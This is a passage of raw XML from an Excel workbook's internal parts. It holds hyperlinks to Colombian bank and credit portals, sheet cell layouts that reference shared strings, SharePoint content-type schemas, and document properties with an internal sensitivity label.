    <hyperlink ref="B52" r:id="rId8" display="https://bpm.santanderconsumer.co" xr:uid="{00000000-0004-0000-0300-00000A000000}"/>
    <hyperlink ref="B12" r:id="rId9" display="https://tucarro.premiercredit.co:12443/" xr:uid="{00000000-0004-0000-0300-000007000000}"/>
    <hyperlink ref="B55" r:id="rId10" display="https://consola.reconoserid.com/" xr:uid="{AC3BB300-A692-470D-98C4-459E7DA58B82}"/>
    <hyperlink ref="B56" r:id="rId11" xr:uid="{F9B9A247-466C-4BBF-BEE9-A52F18F800CB}"/>
    <hyperlink ref="B57" r:id="rId12" xr:uid="{0BC85A73-A07A-462D-9A1A-06346A48E77C}"/>
    <hyperlink ref="B58" r:id="rId13" xr:uid="{5CC07D5D-BB86-4FA2-B94A-D092B8778791}"/>
    <hyperlink ref="B68" r:id="rId14" xr:uid="{6A888048-B809-4838-9CA1-C4B2D4673758}"/>
    <hyperlink ref="B3" r:id="rId15" display="https://www.santander.com.co/" xr:uid="{00000000-0004-0000-0300-000001000000}"/>
    <hyperlink ref="B49" r:id="rId16" xr:uid="{C7D2B161-8CB8-4BD3-96F3-794BB50240E3}"/>
    <hyperlink ref="B31" r:id="rId17" xr:uid="{D75D2301-C2AB-4725-B9B7-87CCE43E276F}"/>
    <hyperlink ref="B47" r:id="rId18" xr:uid="{E1375CF3-B75B-407D-AF33-8E2C790EF0B5}"/>
    <hyperlink ref="B15" r:id="rId19" xr:uid="{2252EC25-3D6A-4722-A509-D37B60F5694C}"/>
  </hyperlinks>
  <pageMargins left="0.7" right="0.7" top="0.75" bottom="0.75" header="0.3" footer="0.3"/>
  <pageSetup paperSize="9" orientation="portrait" r:id="rId2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C3008-CA61-439B-9BF8-29CE9A38DB36}">
  <dimension ref="A1:C33"/>
  <sheetViews>
    <sheetView topLeftCell="A13" workbookViewId="0">
      <selection activeCell="B1" sqref="B1:C12"/>
    </sheetView>
  </sheetViews>
  <sheetFormatPr baseColWidth="10" defaultColWidth="11.453125" defaultRowHeight="14.5" x14ac:dyDescent="0.35"/>
  <cols>
    <col min="1" max="1" width="3.26953125" customWidth="1"/>
    <col min="2" max="2" width="25.7265625" bestFit="1" customWidth="1"/>
    <col min="3" max="3" width="109.81640625" bestFit="1" customWidth="1"/>
    <col min="5" max="5" width="17.54296875" customWidth="1"/>
    <col min="6" max="6" width="26.7265625" customWidth="1"/>
    <col min="7" max="7" width="22.54296875" customWidth="1"/>
    <col min="8" max="8" width="30.26953125" customWidth="1"/>
    <col min="12" max="12" width="20.54296875" customWidth="1"/>
  </cols>
  <sheetData>
    <row r="1" spans="1:3" x14ac:dyDescent="0.35">
      <c r="A1" s="25" t="s">
        <v>3386</v>
      </c>
      <c r="B1" s="16" t="s">
        <v>0</v>
      </c>
      <c r="C1" s="19" t="s">
        <v>3387</v>
      </c>
    </row>
    <row r="2" spans="1:3" x14ac:dyDescent="0.35">
      <c r="A2" s="25" t="s">
        <v>3388</v>
      </c>
      <c r="B2" s="16" t="s">
        <v>1</v>
      </c>
      <c r="C2" s="19" t="s">
        <v>3389</v>
      </c>
    </row>
    <row r="3" spans="1:3" x14ac:dyDescent="0.35">
      <c r="A3" s="25" t="s">
        <v>3390</v>
      </c>
      <c r="B3" s="16" t="s">
        <v>2</v>
      </c>
      <c r="C3" s="19" t="s">
        <v>3391</v>
      </c>
    </row>
    <row r="4" spans="1:3" x14ac:dyDescent="0.35">
      <c r="A4" s="25" t="s">
        <v>3392</v>
      </c>
      <c r="B4" s="16" t="s">
        <v>3</v>
      </c>
      <c r="C4" s="19" t="s">
        <v>3393</v>
      </c>
    </row>
    <row r="5" spans="1:3" ht="58" x14ac:dyDescent="0.35">
      <c r="A5" s="25" t="s">
        <v>3394</v>
      </c>
      <c r="B5" s="16" t="s">
        <v>4</v>
      </c>
      <c r="C5" s="20" t="s">
        <v>3395</v>
      </c>
    </row>
    <row r="6" spans="1:3" x14ac:dyDescent="0.35">
      <c r="A6" s="25" t="s">
        <v>3396</v>
      </c>
      <c r="B6" s="16" t="s">
        <v>5</v>
      </c>
      <c r="C6" s="20" t="s">
        <v>3397</v>
      </c>
    </row>
    <row r="7" spans="1:3" x14ac:dyDescent="0.35">
      <c r="A7" s="25" t="s">
        <v>3398</v>
      </c>
      <c r="B7" s="17" t="s">
        <v>6</v>
      </c>
      <c r="C7" s="19" t="s">
        <v>3399</v>
      </c>
    </row>
    <row r="8" spans="1:3" x14ac:dyDescent="0.35">
      <c r="A8" s="25" t="s">
        <v>3400</v>
      </c>
      <c r="B8" s="16" t="s">
        <v>7</v>
      </c>
      <c r="C8" s="19" t="s">
        <v>3401</v>
      </c>
    </row>
    <row r="9" spans="1:3" x14ac:dyDescent="0.35">
      <c r="A9" s="25" t="s">
        <v>3402</v>
      </c>
      <c r="B9" s="16" t="s">
        <v>8</v>
      </c>
      <c r="C9" s="19" t="s">
        <v>3403</v>
      </c>
    </row>
    <row r="10" spans="1:3" x14ac:dyDescent="0.35">
      <c r="A10" s="25" t="s">
        <v>3404</v>
      </c>
      <c r="B10" s="16" t="s">
        <v>2043</v>
      </c>
      <c r="C10" s="19" t="s">
        <v>3405</v>
      </c>
    </row>
    <row r="11" spans="1:3" ht="29" x14ac:dyDescent="0.35">
      <c r="A11" s="25" t="s">
        <v>3406</v>
      </c>
      <c r="B11" s="16" t="s">
        <v>9</v>
      </c>
      <c r="C11" s="20" t="s">
        <v>3407</v>
      </c>
    </row>
    <row r="12" spans="1:3" ht="72.5" x14ac:dyDescent="0.35">
      <c r="A12" s="25" t="s">
        <v>3408</v>
      </c>
      <c r="B12" s="16" t="s">
        <v>10</v>
      </c>
      <c r="C12" s="20" t="s">
        <v>3409</v>
      </c>
    </row>
    <row r="13" spans="1:3" ht="174" x14ac:dyDescent="0.35">
      <c r="A13" s="25" t="s">
        <v>3410</v>
      </c>
      <c r="B13" s="16" t="s">
        <v>11</v>
      </c>
      <c r="C13" s="20" t="s">
        <v>3411</v>
      </c>
    </row>
    <row r="14" spans="1:3" ht="130.5" x14ac:dyDescent="0.35">
      <c r="A14" s="25" t="s">
        <v>3412</v>
      </c>
      <c r="B14" s="17" t="s">
        <v>12</v>
      </c>
      <c r="C14" s="20" t="s">
        <v>3413</v>
      </c>
    </row>
    <row r="15" spans="1:3" ht="43.5" x14ac:dyDescent="0.35">
      <c r="A15" s="25" t="s">
        <v>3414</v>
      </c>
      <c r="B15" s="17" t="s">
        <v>13</v>
      </c>
      <c r="C15" s="20" t="s">
        <v>3415</v>
      </c>
    </row>
    <row r="16" spans="1:3" x14ac:dyDescent="0.35">
      <c r="A16" s="25" t="s">
        <v>3416</v>
      </c>
      <c r="B16" s="16" t="s">
        <v>14</v>
      </c>
      <c r="C16" s="19" t="s">
        <v>3417</v>
      </c>
    </row>
    <row r="17" spans="1:3" x14ac:dyDescent="0.35">
      <c r="A17" s="25" t="s">
        <v>3418</v>
      </c>
      <c r="B17" s="16" t="s">
        <v>15</v>
      </c>
      <c r="C17" s="19" t="s">
        <v>3419</v>
      </c>
    </row>
    <row r="18" spans="1:3" x14ac:dyDescent="0.35">
      <c r="A18" s="25" t="s">
        <v>3420</v>
      </c>
      <c r="B18" s="16" t="s">
        <v>16</v>
      </c>
      <c r="C18" s="19" t="s">
        <v>3421</v>
      </c>
    </row>
    <row r="19" spans="1:3" x14ac:dyDescent="0.35">
      <c r="A19" s="25" t="s">
        <v>3422</v>
      </c>
      <c r="B19" s="16" t="s">
        <v>17</v>
      </c>
      <c r="C19" s="19" t="s">
        <v>3423</v>
      </c>
    </row>
    <row r="20" spans="1:3" x14ac:dyDescent="0.35">
      <c r="A20" s="25" t="s">
        <v>3424</v>
      </c>
      <c r="B20" s="16" t="s">
        <v>18</v>
      </c>
      <c r="C20" s="19" t="s">
        <v>3425</v>
      </c>
    </row>
    <row r="21" spans="1:3" x14ac:dyDescent="0.35">
      <c r="A21" s="25" t="s">
        <v>3426</v>
      </c>
      <c r="B21" s="16" t="s">
        <v>19</v>
      </c>
      <c r="C21" s="19" t="s">
        <v>3427</v>
      </c>
    </row>
    <row r="22" spans="1:3" ht="87" x14ac:dyDescent="0.35">
      <c r="A22" s="25" t="s">
        <v>3428</v>
      </c>
      <c r="B22" s="18" t="s">
        <v>3429</v>
      </c>
      <c r="C22" s="20" t="s">
        <v>3430</v>
      </c>
    </row>
    <row r="23" spans="1:3" ht="43.5" x14ac:dyDescent="0.35">
      <c r="A23" s="25" t="s">
        <v>3431</v>
      </c>
      <c r="B23" s="16" t="s">
        <v>21</v>
      </c>
      <c r="C23" s="20" t="s">
        <v>3432</v>
      </c>
    </row>
    <row r="24" spans="1:3" x14ac:dyDescent="0.35">
      <c r="A24" s="25" t="s">
        <v>3433</v>
      </c>
      <c r="B24" s="16" t="s">
        <v>22</v>
      </c>
      <c r="C24" s="19" t="s">
        <v>3434</v>
      </c>
    </row>
    <row r="25" spans="1:3" ht="29" x14ac:dyDescent="0.35">
      <c r="A25" s="25" t="s">
        <v>3435</v>
      </c>
      <c r="B25" s="17" t="s">
        <v>23</v>
      </c>
      <c r="C25" s="19" t="s">
        <v>3436</v>
      </c>
    </row>
    <row r="26" spans="1:3" x14ac:dyDescent="0.35">
      <c r="A26" s="25" t="s">
        <v>3437</v>
      </c>
      <c r="B26" s="16" t="s">
        <v>24</v>
      </c>
      <c r="C26" s="19" t="s">
        <v>3438</v>
      </c>
    </row>
    <row r="27" spans="1:3" x14ac:dyDescent="0.35">
      <c r="A27" s="25" t="s">
        <v>3439</v>
      </c>
      <c r="B27" s="16" t="s">
        <v>3440</v>
      </c>
      <c r="C27" s="19" t="s">
        <v>3441</v>
      </c>
    </row>
    <row r="28" spans="1:3" x14ac:dyDescent="0.35">
      <c r="A28" s="25" t="s">
        <v>3442</v>
      </c>
      <c r="B28" s="17" t="s">
        <v>26</v>
      </c>
      <c r="C28" s="19" t="s">
        <v>3443</v>
      </c>
    </row>
    <row r="29" spans="1:3" x14ac:dyDescent="0.35">
      <c r="A29" s="25" t="s">
        <v>3444</v>
      </c>
      <c r="B29" s="17" t="s">
        <v>27</v>
      </c>
      <c r="C29" s="19" t="s">
        <v>3445</v>
      </c>
    </row>
    <row r="30" spans="1:3" x14ac:dyDescent="0.35">
      <c r="A30" s="25" t="s">
        <v>3446</v>
      </c>
      <c r="B30" s="16" t="s">
        <v>28</v>
      </c>
      <c r="C30" s="19" t="s">
        <v>3447</v>
      </c>
    </row>
    <row r="31" spans="1:3" x14ac:dyDescent="0.35">
      <c r="A31" s="25" t="s">
        <v>3448</v>
      </c>
      <c r="B31" s="16" t="s">
        <v>29</v>
      </c>
      <c r="C31" s="19" t="s">
        <v>3449</v>
      </c>
    </row>
    <row r="32" spans="1:3" x14ac:dyDescent="0.35">
      <c r="A32" s="25" t="s">
        <v>3450</v>
      </c>
      <c r="B32" s="16" t="s">
        <v>30</v>
      </c>
      <c r="C32" s="19" t="s">
        <v>3451</v>
      </c>
    </row>
    <row r="33" spans="1:3" x14ac:dyDescent="0.35">
      <c r="A33" s="59" t="s">
        <v>3452</v>
      </c>
      <c r="B33" s="58" t="s">
        <v>31</v>
      </c>
      <c r="C33" s="19" t="s">
        <v>3453</v>
      </c>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9F52-193F-4AAA-848E-B6172944B2D0}">
  <dimension ref="A1:A23"/>
  <sheetViews>
    <sheetView workbookViewId="0">
      <selection activeCell="A23" sqref="A1:A23"/>
    </sheetView>
  </sheetViews>
  <sheetFormatPr baseColWidth="10" defaultColWidth="11.453125" defaultRowHeight="14.5" x14ac:dyDescent="0.35"/>
  <cols>
    <col min="1" max="1" width="46.1796875" bestFit="1" customWidth="1"/>
  </cols>
  <sheetData>
    <row r="1" spans="1:1" x14ac:dyDescent="0.35">
      <c r="A1" t="s">
        <v>2930</v>
      </c>
    </row>
    <row r="2" spans="1:1" x14ac:dyDescent="0.35">
      <c r="A2" t="s">
        <v>2924</v>
      </c>
    </row>
    <row r="3" spans="1:1" x14ac:dyDescent="0.35">
      <c r="A3" t="s">
        <v>3663</v>
      </c>
    </row>
    <row r="4" spans="1:1" x14ac:dyDescent="0.35">
      <c r="A4" t="s">
        <v>2512</v>
      </c>
    </row>
    <row r="5" spans="1:1" x14ac:dyDescent="0.35">
      <c r="A5" t="s">
        <v>3545</v>
      </c>
    </row>
    <row r="6" spans="1:1" x14ac:dyDescent="0.35">
      <c r="A6" t="s">
        <v>2487</v>
      </c>
    </row>
    <row r="7" spans="1:1" x14ac:dyDescent="0.35">
      <c r="A7" t="s">
        <v>3059</v>
      </c>
    </row>
    <row r="8" spans="1:1" x14ac:dyDescent="0.35">
      <c r="A8" t="s">
        <v>3132</v>
      </c>
    </row>
    <row r="9" spans="1:1" x14ac:dyDescent="0.35">
      <c r="A9" t="s">
        <v>3664</v>
      </c>
    </row>
    <row r="10" spans="1:1" x14ac:dyDescent="0.35">
      <c r="A10" t="s">
        <v>3065</v>
      </c>
    </row>
    <row r="11" spans="1:1" x14ac:dyDescent="0.35">
      <c r="A11" t="s">
        <v>2480</v>
      </c>
    </row>
    <row r="12" spans="1:1" x14ac:dyDescent="0.35">
      <c r="A12" t="s">
        <v>3136</v>
      </c>
    </row>
    <row r="13" spans="1:1" x14ac:dyDescent="0.35">
      <c r="A13" t="s">
        <v>1835</v>
      </c>
    </row>
    <row r="14" spans="1:1" x14ac:dyDescent="0.35">
      <c r="A14" t="s">
        <v>1830</v>
      </c>
    </row>
    <row r="15" spans="1:1" x14ac:dyDescent="0.35">
      <c r="A15" t="s">
        <v>2200</v>
      </c>
    </row>
    <row r="16" spans="1:1" x14ac:dyDescent="0.35">
      <c r="A16" t="s">
        <v>2510</v>
      </c>
    </row>
    <row r="17" spans="1:1" x14ac:dyDescent="0.35">
      <c r="A17" t="s">
        <v>3140</v>
      </c>
    </row>
    <row r="18" spans="1:1" x14ac:dyDescent="0.35">
      <c r="A18" t="s">
        <v>2976</v>
      </c>
    </row>
    <row r="19" spans="1:1" x14ac:dyDescent="0.35">
      <c r="A19" t="s">
        <v>2912</v>
      </c>
    </row>
    <row r="20" spans="1:1" x14ac:dyDescent="0.35">
      <c r="A20" t="s">
        <v>3070</v>
      </c>
    </row>
    <row r="21" spans="1:1" x14ac:dyDescent="0.35">
      <c r="A21" t="s">
        <v>2097</v>
      </c>
    </row>
    <row r="22" spans="1:1" x14ac:dyDescent="0.35">
      <c r="A22" t="s">
        <v>2969</v>
      </c>
    </row>
    <row r="23" spans="1:1" x14ac:dyDescent="0.35">
      <c r="A23" t="s">
        <v>2134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7633-59CB-4DA6-AD2B-8FAB970BEA57}">
  <dimension ref="A1:A23"/>
  <sheetViews>
    <sheetView topLeftCell="A4" workbookViewId="0">
      <selection activeCell="F16" sqref="F16"/>
    </sheetView>
  </sheetViews>
  <sheetFormatPr baseColWidth="10" defaultColWidth="11.453125" defaultRowHeight="14.5" x14ac:dyDescent="0.35"/>
  <sheetData>
    <row r="1" spans="1:1" x14ac:dyDescent="0.35">
      <c r="A1" t="s">
        <v>2930</v>
      </c>
    </row>
    <row r="2" spans="1:1" x14ac:dyDescent="0.35">
      <c r="A2" t="s">
        <v>2924</v>
      </c>
    </row>
    <row r="3" spans="1:1" x14ac:dyDescent="0.35">
      <c r="A3" t="s">
        <v>3663</v>
      </c>
    </row>
    <row r="4" spans="1:1" x14ac:dyDescent="0.35">
      <c r="A4" t="s">
        <v>2512</v>
      </c>
    </row>
    <row r="5" spans="1:1" x14ac:dyDescent="0.35">
      <c r="A5" t="s">
        <v>3545</v>
      </c>
    </row>
    <row r="6" spans="1:1" x14ac:dyDescent="0.35">
      <c r="A6" t="s">
        <v>2487</v>
      </c>
    </row>
    <row r="7" spans="1:1" x14ac:dyDescent="0.35">
      <c r="A7" t="s">
        <v>3059</v>
      </c>
    </row>
    <row r="8" spans="1:1" x14ac:dyDescent="0.35">
      <c r="A8" t="s">
        <v>3132</v>
      </c>
    </row>
    <row r="9" spans="1:1" x14ac:dyDescent="0.35">
      <c r="A9" t="s">
        <v>3664</v>
      </c>
    </row>
    <row r="10" spans="1:1" x14ac:dyDescent="0.35">
      <c r="A10" t="s">
        <v>3065</v>
      </c>
    </row>
    <row r="11" spans="1:1" x14ac:dyDescent="0.35">
      <c r="A11" t="s">
        <v>2480</v>
      </c>
    </row>
    <row r="12" spans="1:1" x14ac:dyDescent="0.35">
      <c r="A12" t="s">
        <v>3136</v>
      </c>
    </row>
    <row r="13" spans="1:1" x14ac:dyDescent="0.35">
      <c r="A13" t="s">
        <v>1835</v>
      </c>
    </row>
    <row r="14" spans="1:1" x14ac:dyDescent="0.35">
      <c r="A14" t="s">
        <v>1830</v>
      </c>
    </row>
    <row r="15" spans="1:1" x14ac:dyDescent="0.35">
      <c r="A15" t="s">
        <v>2200</v>
      </c>
    </row>
    <row r="16" spans="1:1" x14ac:dyDescent="0.35">
      <c r="A16" t="s">
        <v>2510</v>
      </c>
    </row>
    <row r="17" spans="1:1" x14ac:dyDescent="0.35">
      <c r="A17" t="s">
        <v>3140</v>
      </c>
    </row>
    <row r="18" spans="1:1" x14ac:dyDescent="0.35">
      <c r="A18" t="s">
        <v>2976</v>
      </c>
    </row>
    <row r="19" spans="1:1" x14ac:dyDescent="0.35">
      <c r="A19" t="s">
        <v>2912</v>
      </c>
    </row>
    <row r="20" spans="1:1" x14ac:dyDescent="0.35">
      <c r="A20" t="s">
        <v>3070</v>
      </c>
    </row>
    <row r="21" spans="1:1" x14ac:dyDescent="0.35">
      <c r="A21" t="s">
        <v>2097</v>
      </c>
    </row>
    <row r="22" spans="1:1" x14ac:dyDescent="0.35">
      <c r="A22" t="s">
        <v>2969</v>
      </c>
    </row>
    <row r="23" spans="1:1" x14ac:dyDescent="0.35">
      <c r="A23" t="s">
        <v>2134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4b0e803-dcd9-4f44-bb37-e5995d9e51ed" xsi:nil="true"/>
    <lcf76f155ced4ddcb4097134ff3c332f xmlns="516ea657-e979-4819-8a44-6d8f6783e49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DA1BF611AEA140B8EA47AB2AF49610" ma:contentTypeVersion="16" ma:contentTypeDescription="Create a new document." ma:contentTypeScope="" ma:versionID="7d510a6e47c0425534953af3ce8708b1">
  <xsd:schema xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:xs="http://www.w3.org/2001/XMLSchema" xmlns:p="http://schemas.microsoft.com/office/2006/metadata/properties" xmlns:ns1="http://schemas.microsoft.com/sharepoint/v3" xmlns:ns2="516ea657-e979-4819-8a44-6d8f6783e490" xmlns:ns3="a4b0e803-dcd9-4f44-bb37-e5995d9e51ed" targetNamespace="http://schemas.microsoft.com/office/2006/metadata/properties" ma:root="true" ma:fieldsID="8ecea22d5a04bd1b3f06fc13cb71449c" ns1:_="" ns2:_="" ns3:_="">
    <xsd:import namespace="http://schemas.microsoft.com/sharepoint/v3"/>
    <xsd:import namespace="516ea657-e979-4819-8a44-6d8f6783e490"/>
    <xsd:import namespace="a4b0e803-dcd9-4f44-bb37-e5995d9e51e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6ea657-e979-4819-8a44-6d8f6783e4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b0e803-dcd9-4f44-bb37-e5995d9e51e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c7eaaa6-abcf-467a-b7d2-18bdd7c92f35}" ma:internalName="TaxCatchAll" ma:showField="CatchAllData" ma:web="a4b0e803-dcd9-4f44-bb37-e5995d9e51ed">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8EEF91-2E85-448B-9CF6-0632E78A052D}">
  <ds:schemaRefs>
    <ds:schemaRef ds:uri="http://schemas.microsoft.com/sharepoint/v3/contenttype/forms"/>
  </ds:schemaRefs>
</ds:datastoreItem>
</file>

<file path=customXml/itemProps2.xml><?xml version="1.0" encoding="utf-8"?>
<ds:datastoreItem xmlns:ds="http://schemas.openxmlformats.org/officeDocument/2006/customXml" ds:itemID="{EDD2CCBB-A13D-475B-957F-EC7BB4ADFD20}">
  <ds:schemaRefs>
    <ds:schemaRef ds:uri="http://www.w3.org/XML/1998/namespace"/>
    <ds:schemaRef ds:uri="http://schemas.microsoft.com/office/infopath/2007/PartnerControl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a4b0e803-dcd9-4f44-bb37-e5995d9e51ed"/>
    <ds:schemaRef ds:uri="516ea657-e979-4819-8a44-6d8f6783e490"/>
    <ds:schemaRef ds:uri="http://schemas.microsoft.com/sharepoint/v3"/>
    <ds:schemaRef ds:uri="http://purl.org/dc/dcmitype/"/>
  </ds:schemaRefs>
</ds:datastoreItem>
</file>

<file path=customXml/itemProps3.xml><?xml version="1.0" encoding="utf-8"?>
<ds:datastoreItem xmlns:ds="http://schemas.openxmlformats.org/officeDocument/2006/customXml" ds:itemID="{2E56EF58-3FE1-4D3E-983A-E49EEA4693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16ea657-e979-4819-8a44-6d8f6783e490"/>
    <ds:schemaRef ds:uri="a4b0e803-dcd9-4f44-bb37-e5995d9e51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BSNC (2)</vt:lpstr>
      <vt:lpstr>BSNC -DT</vt:lpstr>
      <vt:lpstr>BSNC</vt:lpstr>
      <vt:lpstr>SF -DT</vt:lpstr>
      <vt:lpstr>SF</vt:lpstr>
      <vt:lpstr>Hoja2</vt:lpstr>
      <vt:lpstr>IFA'S</vt:lpstr>
      <vt:lpstr>Descripción</vt:lpstr>
      <vt:lpstr>hoja1</vt:lpstr>
      <vt:lpstr>cruc SF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x328639</dc:creator>
  <cp:keywords/>
  <dc:description/>
  <cp:lastModifiedBy>Ciprian Osorio Jonny Alejandro</cp:lastModifiedBy>
  <cp:revision/>
  <dcterms:created xsi:type="dcterms:W3CDTF">2020-01-10T13:54:25Z</dcterms:created>
  <dcterms:modified xsi:type="dcterms:W3CDTF">2026-07-07T10:59:52Z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0x0101002CDA1BF611AEA140B8EA47AB2AF49610</vt:lpwstr>
  </property>
  <property fmtid="{D5CDD505-2E9C-101B-9397-08002B2CF9AE}" pid="3" name="MSIP_Label_0c2abd79-57a9-4473-8700-c843f76a1e37_Enabled">
    <vt:lpwstr>true</vt:lpwstr>
  </property>
  <property fmtid="{D5CDD505-2E9C-101B-9397-08002B2CF9AE}" pid="4" name="MSIP_Label_0c2abd79-57a9-4473-8700-c843f76a1e37_SetDate">
    <vt:lpwstr>2021-10-21T04:24:18Z</vt:lpwstr>
  </property>
  <property fmtid="{D5CDD505-2E9C-101B-9397-08002B2CF9AE}" pid="5" name="MSIP_Label_0c2abd79-57a9-4473-8700-c843f76a1e37_Method">
    <vt:lpwstr>Privileged</vt:lpwstr>
  </property>
  <property fmtid="{D5CDD505-2E9C-101B-9397-08002B2CF9AE}" pid="6" name="MSIP_Label_0c2abd79-57a9-4473-8700-c843f76a1e37_Name">
    <vt:lpwstr>Internal</vt:lpwstr>
  </property>
  <property fmtid="{D5CDD505-2E9C-101B-9397-08002B2CF9AE}" pid="7" name="MSIP_Label_0c2abd79-57a9-4473-8700-c843f76a1e37_SiteId">
    <vt:lpwstr>35595a02-4d6d-44ac-99e1-f9ab4cd872db</vt:lpwstr>
  </property>
  <property fmtid="{D5CDD505-2E9C-101B-9397-08002B2CF9AE}" pid="8" name="MSIP_Label_0c2abd79-57a9-4473-8700-c843f76a1e37_ActionId">
    <vt:lpwstr>342a1c34-dde6-47c8-8efc-37a54173a04e</vt:lpwstr>
  </property>
  <property fmtid="{D5CDD505-2E9C-101B-9397-08002B2CF9AE}" pid="9" name="MSIP_Label_0c2abd79-57a9-4473-8700-c843f76a1e37_ContentBits">
    <vt:lpwstr>0</vt:lpwstr>
  </property>
  <property fmtid="{D5CDD505-2E9C-101B-9397-08002B2CF9AE}" pid="10" name="MediaServiceImageTags">
    <vt:lpwstr/>
  </property>
</Properties>
</file>